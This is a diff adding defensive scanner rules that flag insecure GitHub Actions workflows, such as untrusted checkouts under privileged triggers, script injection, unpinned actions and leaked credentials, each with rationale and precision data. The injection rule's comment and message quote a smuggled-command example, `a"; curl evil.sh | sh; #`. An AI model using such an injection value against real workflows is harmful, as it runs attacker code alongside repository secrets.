@@ -1,0 +1,404 @@
+# Tier 2 coverage rules for GitHub Actions workflow files.
+#
+# Original work of this repository. No rule here is copied or adapted from opengrep-rules
+# or semgrep-rules: both are licensed in a way that forbids use inside a paid service. See
+# docs/legal/third-party-rules.md.
+#
+# ── What this file is for ──────────────────────────────────────────────────────────────
+#
+# The product reviews a stranger's pull request on behalf of a maintainer. The first thing a
+# hostile pull request can attack is the repository's own automation, and until this file
+# existed nothing in the product read a workflow at all. A workflow change is also the
+# highest value per rule in the set: it fires rarely, and it is close to unambiguous, because
+# a workflow either checks out untrusted code under a privileged trigger or it does not.
+#
+# The measurement behind every rule below is in
+# docs/validation/workflow-tampering-2026-09.md.
+#
+# ── Why `generic`, and why most rules are a bare regex ─────────────────────────────────
+#
+# The scanner has a `yaml` parser, and it was rejected for the same reason the template rules
+# rejected the `html` one: what these rules have to express is not a node in a YAML tree.
+# Almost every shape below is a relation between a *trigger* at the top of the document and a
+# *step* many lines down inside it, and a YAML pattern cannot state "this key is in the same
+# document as that key" any more readably than a regex can.
+#
+# So the rules are `generic` and the patterns are PCRE. Each one names the trigger, skips
+# forward with `.*?`, and then uses `\K` to reset the reported match to the offending step, so
+# the finding lands on the line a reviewer has to change rather than on the `on:` block.
+#
+# ── The one thing to know before editing a pattern here ────────────────────────────────
+#
+# `pattern-inside: "run: ..."` was tried first and it is wrong. In `generic` mode `...` is
+# token matching with no notion of a YAML block, so it runs past the end of the step: a
+# single-line `- run: npm i` swallowed the *next* step's `if:` line, and the rule reported
+# `if: ${{ contains(github.event.head_commit.message, '[r2]') }}` as shell injection ten times
+# across electerm's build workflows. An `if:` expression is not a shell, so all ten were
+# false. Those lines are checked in as no-finding cases in
+# `benchmarks/tier2-precision/cases.json`.
+#
+# What replaced it is the two-alternative shape used by the injection and build rules: one
+# alternative for the interpolation on the `run:` line itself, and one for a block scalar
+# (`run: |`), where the crossing is tempered so it cannot pass a line that opens a new step
+# key (`name:`, `if:`, `env:`, `with:`, `uses:`, and the rest) or a new list item. A shell
+# comment inside the script is deliberately crossable: `# install first` is script text, and
+# refusing to cross it lost real matches.
+#
+# ── The one rule about writing a rule here ─────────────────────────────────────────────
+#
+# **Every rule in this file must carry `paths: include`, and the include must be exactly the
+# two `.github/workflows/` globs.** The scanner runs one process over a whole batch directory,
+# and a `generic` rule with no include reads every file in that batch. An include of `*.yml`
+# would be nearly as bad: a repository's Kubernetes manifests, its Helm values, its
+# `docker-compose.yml` and another provider's CI config are all YAML, and `run:`, `ref:` and
+# `permissions:` mean something else in every one of them.
+# tests/test_workflow_rules_are_path_scoped.py fails if an include is missing or wider, and it
+# also runs the whole file through the real scanner over ordinary YAML to check the scoping
+# holds in practice and not just in the metadata.
+rules:
+  # ── A privileged trigger that checks out untrusted code ────────────────────
+
+  - id: cwe-829.gha-untrusted-checkout-privileged-trigger
+    # `pull_request_target` and `workflow_run` run in the context of the base repository, with
+    # its secrets and a writable token, and they run the *base* revision of the workflow.
+    # Checking out the pull request head or merge ref inside one of those puts a stranger's
+    # code in that context. Everything the job runs afterwards -- a build, a test, an action's
+    # entrypoint, a package lifecycle script -- is then the attacker's to choose.
+    pattern-regex: '(?ms)^[ \t]{0,4}(?:pull_request_target|workflow_run)[ \t]*:.*?\K^[ \t]*(?:-[ \t]+)?ref[ \t]*:[ \t]*(?:''|")?(?:\$\{\{[ \t]*github\.event\.pull_request\.(?:head\.(?:sha|ref)|merge_commit_sha)|\$\{\{[ \t]*github\.event\.workflow_run\.head_(?:sha|branch)|\$\{\{[ \t]*github\.head_ref|refs/pull/)'
+    message: >-
+      This workflow runs on `pull_request_target` or `workflow_run`, which executes with the
+      base repository's secrets and a writable token, and it checks out the pull request's own
+      revision. A contributor controls that revision, so everything the job runs after this
+      step is theirs to choose. Check out the base revision, or move the untrusted work to a
+      `pull_request` workflow, which has no secrets.
+    severity: ERROR
+    languages: [generic]
+    paths:
+      include: [".github/workflows/*.yml", ".github/workflows/*.yaml"]
+    metadata:
+      cwe: "CWE-829"
+      owasp: "A08:2021"
+      category: "CI/CD"
+      internal_type: "untrusted_code_checkout"
+      confidence: "0.9"
+      precision_evidence: >-
+        docs/validation/workflow-tampering-2026-09.md: zero findings over 240 workflow files
+        from 27 repositories (the eleven clean replay repositories, the fifteen
+        vulnerable-corpus repositories that have a workflow directory, and this repository).
+        Posts under the second clause of the policy: the pattern names two literal constructs
+        in one document and makes no data-flow assumption, and the combination is the
+        vulnerability GitHub's own documentation describes.
+      posting: post
+
+  - id: cwe-829.gha-build-step-under-privileged-trigger
+    # The checkout rule above catches the explicit `ref:`. This one catches the other half of
+    # the same mistake: a `pull_request_target` workflow that installs dependencies or runs a
+    # build or a test. Those commands execute code out of the tree they run in -- `npm ci` runs
+    # lifecycle scripts, a test run executes the repository's own test files -- so if any
+    # untrusted revision is present the job is already compromised. It is separate from the
+    # checkout rule because a workflow can reach the untrusted tree by other means: an
+    # artifact download, a manual `git fetch`, or a `gh pr checkout`.
+    pattern-either:
+      - pattern-regex: '(?ms)^[ \t]{0,4}pull_request_target[ \t]*:.*?\K^[ \t]*(?:-[ \t]+)?run[ \t]*:[^\n]*(?:npm[ \t]+(?:ci|install|i|run|test)|yarn[ \t]+(?:install|build|test)|pnpm[ \t]+(?:install|build|test)|pip[ \t]+install|poetry[ \t]+install|bundle[ \t]+install|make[ \t]+(?:all|build|test|check)|mvn[ \t]|gradlew?[ \t]|cargo[ \t]+(?:build|test)|go[ \t]+(?:build|test)|pytest|tox)'
+      - pattern-regex: '(?ms)^[ \t]{0,4}pull_request_target[ \t]*:.*?^[ \t]*(?:-[ \t]+)?run[ \t]*:[ \t]*[|>][-+0-9]*[ \t]*(?:#[^\n]*)?\n(?:(?![ \t]*(?:-[ \t]|(?:name|id|if|env|with|uses|run|shell|working-directory|continue-on-error|timeout-minutes|permissions|steps|jobs|needs|strategy|outputs|defaults)[ \t]*:))[^\n]*\n)*?\K[ \t]*(?:npm[ \t]+(?:ci|install|i|run|test)|yarn[ \t]+(?:install|build|test)|pnpm[ \t]+(?:install|build|test)|pip[ \t]+install|poetry[ \t]+install|bundle[ \t]+install|make[ \t]+(?:all|build|test|check)|mvn[ \t]|gradlew?[ \t]|cargo[ \t]+(?:build|test)|go[ \t]+(?:build|test)|pytest|tox)'
+    message: >-
+      A `pull_request_target` job runs with the base repository's secrets and a writable token,
+      and this step installs dependencies or runs a build or a test. Those commands execute
+      code from the tree they run in, so they must never run on a contributor's revision here.
+      Do the build in a `pull_request` workflow and use `workflow_run` only to read its
+      artifacts.
+    severity: ERROR
+    languages: [generic]
+    paths:
+      include: [".github/workflows/*.yml", ".github/workflows/*.yaml"]
+    metadata:
+      cwe: "CWE-829"
+      owasp: "A08:2021"
+      category: "CI/CD"
+      internal_type: "untrusted_build_execution"
+      confidence: "0.8"
+      precision_evidence: >-
+        docs/validation/workflow-tampering-2026-09.md: zero findings over 240 workflow files
+        from 27 repositories. Posts under the second clause of the policy: the pattern is a
+        literal trigger plus a literal package-manager or build command, with no data-flow
+        assumption.
+      posting: post
+
+  # ── Shell injection through an expression interpolation ────────────────────
+
+  - id: cwe-78.gha-run-untrusted-interpolation
+    # `${{ }}` is substituted into the script *before* the shell sees it, so a value a
+    # contributor controls becomes shell source. An issue titled `a"; curl evil.sh | sh; #` is
+    # a command, not a title.
+    #
+    # The field list is GitHub's own documented set of attacker-controlled event data: titles,
+    # bodies, comment and review bodies, commit messages and author identities, and the branch
+    # name a fork chooses. `github.head_ref` is in it because a branch name may contain almost
+    # anything.
+    #
+    # The recommended fix -- bind the value in the step's `env:` block and use `"$VAR"` --
+    # deliberately does not match: an `env:` key is not inside the script, so the rule goes
+    # quiet exactly when the defect is gone. That is also what makes the static assertion
+    # verification level able to prove the patch.
+    pattern-either:
+      - pattern-regex: '(?m)^[ \t]*(?:-[ \t]+)?run[ \t]*:[^\n]*?\K\$\{\{[^}]*?(?:github\.event\.(?:issue|pull_request|discussion)\.(?:title|body)|github\.event\.(?:comment|review|review_comment)\.body|github\.event\.(?:head_commit|commits\[[^]]*\])\.(?:message|author\.(?:name|email))|github\.event\.pull_request\.head\.(?:ref|label)|github\.event\.pull_request\.head\.repo\.(?:default_branch|description|homepage)|github\.head_ref)[^}]*\}\}'
+      - pattern-regex: '(?m)^[ \t]*(?:-[ \t]+)?run[ \t]*:[ \t]*[|>][-+0-9]*[ \t]*(?:#[^\n]*)?\n(?:(?![ \t]*(?:-[ \t]|(?:name|id|if|env|with|uses|run|shell|working-directory|continue-on-error|timeout-minutes|permissions|steps|jobs|needs|strategy|outputs|defaults)[ \t]*:))[^\n]*\n)*?(?![ \t]*-[ \t])[^\n]*?\K\$\{\{[^}]*?(?:github\.event\.(?:issue|pull_request|discussion)\.(?:title|body)|github\.event\.(?:comment|review|review_comment)\.body|github\.event\.(?:head_commit|commits\[[^]]*\])\.(?:message|author\.(?:name|email))|github\.event\.pull_request\.head\.(?:ref|label)|github\.event\.pull_request\.head\.repo\.(?:default_branch|description|homepage)|github\.head_ref)[^}]*\}\}'
+    message: >-
+      This `run:` script interpolates event data a contributor controls. `${{ }}` is
+      substituted into the script before the shell parses it, so the value becomes shell
+      source: an issue title of `a"; curl evil.sh | sh; #` runs. Bind the value to an
+      environment variable in the step's `env:` block and reference it as `"$VAR"`, which the
+      shell never re-parses.
+    severity: ERROR
+    languages: [generic]
+    paths:
+      include: [".github/workflows/*.yml", ".github/workflows/*.yaml"]
+    metadata:
+      cwe: "CWE-78"
+      owasp: "A03:2021"
+      category: "CI/CD"
+      internal_type: "workflow_script_injection"
+      family: "workflow_hardening"
+      confidence: "0.9"
+      precision_evidence: >-
+        docs/validation/workflow-tampering-2026-09.md: the first version of this rule used
+        `pattern-inside: "run: ..."` and produced 13 findings, of which the 10 read were all
+        false and all the same shape -- an `if:` expression on the step after a single-line
+        `run:`, which `generic` mode's `...` had run past. The pattern now scopes the script
+        itself, and produces zero findings over the same 240 workflow files from 26
+        repositories. It posts under the second clause of the policy, and the ten false lines
+        are checked in as no-finding cases in benchmarks/tier2-precision/cases.json.
+      posting: post
+
+  # ── An action reference that is not a commit digest ────────────────────────
+
+  - id: cwe-1357.gha-third-party-action-unpinned
+    # A tag and a branch are both mutable. Whoever owns the action can move `v3` to a new
+    # commit, and every workflow that references it runs that commit on its next push, with
+    # whatever token and secrets the job has. Only a full commit digest cannot be moved.
+    #
+    # First-party namespaces are excluded. `actions/*` and `github/*` are published by the
+    # organisation that runs the job, so pinning them defends against nothing in this threat
+    # model, and including them would have made the rule fire on nearly every workflow in
+    # existence -- which is a rule a reviewer learns to ignore. A local composite action or
+    # reusable workflow (`./...`) has no third party at all, and a `docker://` reference is
+    # resolved under Docker's rules rather than Git's.
+    pattern-regex: '(?m)^[ \t]*(?:-[ \t]+)?uses[ \t]*:[ \t]*(?:''|")?(?!\.)(?!docker://)(?![Aa]ctions/)(?![Gg]ithub/)[A-Za-z0-9][\w.-]*/[\w.-]+(?:/[\w.-]+)*@(?![0-9a-fA-F]{40}(?:$|[\s''"]))[^\s''"#]+'
+    message: >-
+      This third-party action is referenced by tag or branch, both of which the action's owner
+      can move to a different commit at any time. The next run would then execute that commit
+      with this job's token and secrets. Pin the reference to the full 40-character commit
+      digest and keep the tag in a trailing comment so the version is still readable.
+    severity: WARNING
+    languages: [generic]
+    paths:
+      include: [".github/workflows/*.yml", ".github/workflows/*.yaml"]
+    metadata:
+      cwe: "CWE-1357"
+      owasp: "A08:2021"
+      category: "CI/CD"
+      internal_type: "unpinned_action_reference"
+      family: "workflow_hardening"
+      confidence: "0.9"
+      precision_evidence: >-
+        docs/validation/workflow-tampering-2026-09.md: 46 findings over 240 workflow files from
+        27 repositories, a seeded random 10 read by hand, 10 true and 0 false, labelled
+        precision 1.00. Three of the ten are a *branch* rather than a tag
+        (`pypa/gh-action-pypi-publish@master`, `google-github-actions/setup-gcloud@master`,
+        `calibreapp/image-actions@main`) in a step that is handed a publishing credential.
+      posting: post
+
+  # ── Token permissions wider than the job needs ─────────────────────────────
+
+  - id: cwe-732.gha-permissions-write-all
+    # `write-all` grants every scope the installation has: contents, packages, deployments,
+    # actions, and the rest. Nothing needs all of them, and the blast radius of any other
+    # defect in the workflow is whatever this line granted.
+    pattern-regex: '(?m)^[ \t]*permissions[ \t]*:[ \t]*(?:''|")?write-all'
+    message: >-
+      `permissions: write-all` grants every scope the app installation has, including
+      `contents`, `packages`, `actions` and `deployments`. Declare only the scopes the job
+      uses; a job that just reads code needs `contents: read`.
+    severity: WARNING
+    languages: [generic]
+    paths:
+      include: [".github/workflows/*.yml", ".github/workflows/*.yaml"]
+    metadata:
+      cwe: "CWE-732"
+      owasp: "A01:2021"
+      category: "CI/CD"
+      internal_type: "excessive_workflow_permissions"
+      confidence: "0.9"
+      precision_evidence: >-
+        docs/validation/workflow-tampering-2026-09.md: zero findings over 240 workflow files
+        from 27 repositories. Posts under the second clause of the policy: a single literal
+        key with a single literal value, whose meaning does not depend on anything the pattern
+        cannot see.
+      posting: post
+
+  - id: cwe-732.gha-write-permission-under-privileged-trigger
+    # Quarantined. Kept because it runs and stays measurable, not because it is right.
+    #
+    # The idea was that "wider than the job needs" is decidable in one case: a privileged
+    # trigger that grants a write scope on something other than comments. It is not. Every one
+    # of the eleven findings this produced was a job that needed exactly the scope it asked
+    # for -- `actions: write` to re-run a workflow, `id-token: write` to mint an OIDC token,
+    # `contents: write` to push a backport branch. A workflow only uses these triggers when it
+    # needs to do something a fork's token cannot, so the scope being present is the reason the
+    # workflow exists.
+    pattern-regex: '(?ms)^[ \t]{0,4}(?:pull_request_target|workflow_run)[ \t]*:.*?\K^[ \t]*(?:contents|packages|actions|deployments|id-token|security-events)[ \t]*:[ \t]*(?:''|")?write'
+    message: >-
+      This workflow runs on a trigger that carries the base repository's secrets and a writable
+      token, and it grants a write scope that lets a job change the repository or publish from
+      it. If the job only needs to comment, narrow the block to `pull-requests: write` and set
+      everything else to `read`.
+    severity: WARNING
+    languages: [generic]
+    paths:
+      include: [".github/workflows/*.yml", ".github/workflows/*.yaml"]
+    metadata:
+      cwe: "CWE-732"
+      owasp: "A01:2021"
+      category: "CI/CD"
+      internal_type: "excessive_workflow_permissions"
+      confidence: "0.8"
+      posting: quarantine
+      posting_evidence: >-
+        docs/validation/workflow-tampering-2026-09.md: 11 findings over 240 workflow files from
+        27 repositories, 10 read by hand, 0 true and 10 false, labelled precision 0.00. Four of
+        the ten are this repository's own workflows. The scopes were `id-token: write` for
+        Workload Identity Federation (three of ours, plus two in vercel/next.js),
+        `actions: write` to re-run or dispatch a workflow (three in vercel/next.js), and
+        `contents: write` to push a branch the job then opens a pull request from (ours and
+        fastify/fastify). Re-enabling this needs something the pattern does not have: what the
+        job actually uses the token for. A version that compares the granted scopes against the
+        API calls the steps make would be a different rule, not a narrowing of this one.
+
+  # ── Credentials and secrets left where untrusted code can read them ────────
+
+  - id: cwe-522.gha-persist-credentials-on-untrusted-checkout
+    # `actions/checkout` writes the job's token into `.git/config` unless
+    # `persist-credentials: false` is set, so a step that checks out a contributor's revision and
+    # persists credentials hands that token to code the contributor wrote.
+    #
+    # The `persist-credentials` key and the untrusted `ref:` must be within six lines of each
+    # other, in either order, because what makes this a finding is that they are the same checkout
+    # step. An earlier version asked only for the trigger, and that is the shape that made
+    # `cwe-732.gha-write-permission-under-privileged-trigger` worthless: a workflow that persists
+    # credentials in a *trusted* checkout is doing something legitimate.
+    #
+    # It deliberately does *not* ask for the trigger, and that is what the rule is for now.
+    # `cwe-829.gha-untrusted-checkout-privileged-trigger` owns the privileged-trigger case and
+    # says the whole step should go, and `finding_quality.SUBSUMED_INTERNAL_TYPES` folds this
+    # rule's finding into that one when both fire, so the pair is one comment. What is left for
+    # this rule alone is the other half: an ordinary `pull_request` workflow that checks out the
+    # head branch and keeps the token, which is the usual shape of a job that pushes a formatting
+    # commit back to a contributor's branch. There the fix is this one line, not the step.
+    pattern-either:
+      - pattern-regex: '(?ms)^[ \t]*ref[ \t]*:[ \t]*(?:''|")?(?:\$\{\{[ \t]*github\.event\.pull_request\.(?:head\.(?:sha|ref)|merge_commit_sha)|\$\{\{[ \t]*github\.event\.workflow_run\.head_(?:sha|branch)|\$\{\{[ \t]*github\.head_ref|refs/pull/)[^\n]*\n(?:[^\n]*\n){0,6}?\K[ \t]*persist-credentials[ \t]*:[ \t]*(?:''|")?true'
+      - pattern-regex: '(?ms)^[ \t]*persist-credentials[ \t]*:[ \t]*(?:''|")?true[^\n]*\n(?:[^\n]*\n){0,6}?[ \t]*ref[ \t]*:[ \t]*(?:''|")?(?:\$\{\{[ \t]*github\.event\.pull_request\.(?:head\.(?:sha|ref)|merge_commit_sha)|\$\{\{[ \t]*github\.event\.workflow_run\.head_(?:sha|branch)|\$\{\{[ \t]*github\.head_ref|refs/pull/)'
+    message: >-
+      This checkout takes a contributor's revision and keeps the job's token in `.git/config`,
+      where any command the job runs afterwards can read it and push with it. Set
+      `persist-credentials: false` on this step, and give the job that does need to push its own
+      step with a token scoped to what it pushes.
+    severity: ERROR
+    languages: [generic]
+    paths:
+      include: [".github/workflows/*.yml", ".github/workflows/*.yaml"]
+    metadata:
+      cwe: "CWE-522"
+      owasp: "A07:2021"
+      category: "CI/CD"
+      internal_type: "workflow_credential_persistence"
+      confidence: "0.85"
+      precision_evidence: >-
+        docs/validation/workflow-tampering-2026-09.md: zero findings over 240 workflow files from
+        27 repositories. That measurement was made while the pattern also required a privileged
+        trigger, so it describes a subset of what this rule now matches and is a lower bound on
+        the widened form rather than a measurement of it; the replay reads GitHub and has not been
+        re-run. Posts under the second clause of the policy: two literal keys in one checkout
+        step, no data-flow assumption. The narrowing to the same step was made before any
+        measurement, on the evidence of the write-permission rule in this file, which asked only
+        for the trigger and scored 0.00, and it is what keeps the widened form honest: a persisted
+        credential on a *trusted* checkout is legitimate and is not matched.
+      posting: post
+
+  - id: cwe-200.gha-secret-in-untrusted-checkout-job
+    # A secret handed to a job that has checked out a contributor's revision is a secret the
+    # contributor can read: the job runs their code, and their code can print an environment
+    # variable. `GITHUB_TOKEN` is deliberately not matched -- it is present in every job
+    # whether or not anyone names it, so naming it says nothing new.
+    #
+    # Three things must line up, in this order: the privileged trigger, a checkout step whose
+    # `ref:` is untrusted, and a secret reference after it. The `uses: ...checkout...` part is
+    # what the first version of this rule was missing, and it cost it its only finding: in
+    # google/slo-generator the `ref:` was an *input to a different action*
+    # (`tomchv/wait-my-workflow`) in a `push`-triggered workflow, and the rule read it as a
+    # checkout of untrusted code. That line is a no-finding case in
+    # benchmarks/tier2-precision/cases.json.
+    pattern-regex: '(?ms)^[ \t]{0,4}(?:pull_request_target|workflow_run)[ \t]*:.*?^[ \t]*(?:-[ \t]+)?uses[ \t]*:[^\n]*checkout[^\n]*\n(?:[^\n]*\n){0,8}?[ \t]*ref[ \t]*:[ \t]*(?:''|")?(?:\$\{\{[ \t]*github\.event\.pull_request\.(?:head\.(?:sha|ref)|merge_commit_sha)|\$\{\{[ \t]*github\.event\.workflow_run\.head_(?:sha|branch)|\$\{\{[ \t]*github\.head_ref|refs/pull/).*?\K^[ \t]*[\w.-]+[ \t]*:[ \t]*(?:''|")?\$\{\{[ \t]*secrets\.(?!GITHUB_TOKEN)[A-Za-z_]\w*'
+    message: >-
+      This job checks out a contributor's revision and is then handed a repository secret. The
+      job runs their code, and their code can read any environment variable, so the secret is
+      theirs. Split the job: run untrusted code with no secrets, and keep the secret in a job
+      that only handles trusted input.
+    severity: ERROR
+    languages: [generic]
+    paths:
+      include: [".github/workflows/*.yml", ".github/workflows/*.yaml"]
+    metadata:
+      cwe: "CWE-200"
+      owasp: "A02:2021"
+      category: "CI/CD"
+      internal_type: "workflow_secret_exposure"
+      confidence: "0.85"
+      precision_evidence: >-
+        docs/validation/workflow-tampering-2026-09.md: the first version omitted the
+        `uses: ...checkout` requirement and the privileged trigger, and produced one finding,
+        read and false: a `ref:` input to `tomchv/wait-my-workflow` in a `push`-triggered
+        workflow in google/slo-generator. The narrowed pattern produces zero findings over the
+        same 240 workflow files from 27 repositories, and posts under the second clause of the
+        policy.
+      posting: post
+
+  # ── A self-hosted runner reachable from a fork ─────────────────────────────
+
+  - id: cwe-668.gha-self-hosted-runner-fork-trigger
+    # Quarantined, and the reason is the one that quarantined `cwe-79.py-jinja-autoescape-off`:
+    # the claim is true only under a fact the pattern cannot see.
+    #
+    # A self-hosted runner is a machine on someone's network and it is not destroyed between
+    # jobs, so a workflow a *fork* can trigger runs a stranger's code there. That is GitHub's
+    # own warning and it is why this rule exists. But whether a fork can trigger it depends on
+    # whether the repository is public and accepts fork pull requests, and a private repository
+    # with a self-hosted runner on `pull_request` is the ordinary, correct setup for a great
+    # many teams. The pattern sees the workflow, not the repository.
+    #
+    # Re-enable it when the finding can carry the repository's visibility, which the analysis
+    # request already knows and does not currently pass to the scanner.
+    pattern-regex: '(?ms)^[ \t]{0,4}(?:pull_request|pull_request_target|issue_comment|fork|workflow_run)[ \t]*:.*?\K^[ \t]*runs-on[ \t]*:[^\n]*(?:''|"|\[|[ \t])self-hosted'
+    message: >-
+      This workflow can be triggered from a fork and it runs on a self-hosted runner. A
+      self-hosted runner is a real machine that survives between jobs, so a contributor's code
+      runs there with whatever the last job left behind and whatever that network can reach.
+      Use a GitHub-hosted runner for anything a fork can trigger.
+    severity: ERROR
+    languages: [generic]
+    paths:
+      include: [".github/workflows/*.yml", ".github/workflows/*.yaml"]
+    metadata:
+      cwe: "CWE-668"
+      owasp: "A08:2021"
+      category: "CI/CD"
+      internal_type: "self_hosted_runner_exposure"
+      confidence: "0.85"
+      posting: quarantine
+      posting_evidence: >-
+        docs/validation/workflow-tampering-2026-09.md: zero findings over 240 workflow files
+        from 27 repositories, so there is no measurement, and it does not qualify for the
+        sink-only exemption. Whether a fork can reach the workflow depends on the repository
+        being public and accepting fork pull requests, which the pattern cannot see, and a
+        self-hosted runner on `pull_request` in a private repository is the normal setup. This
+        is the same objection that quarantined `cwe-79.py-jinja-autoescape-off`. Re-enable it
+        when the finding can carry the repository's visibility.
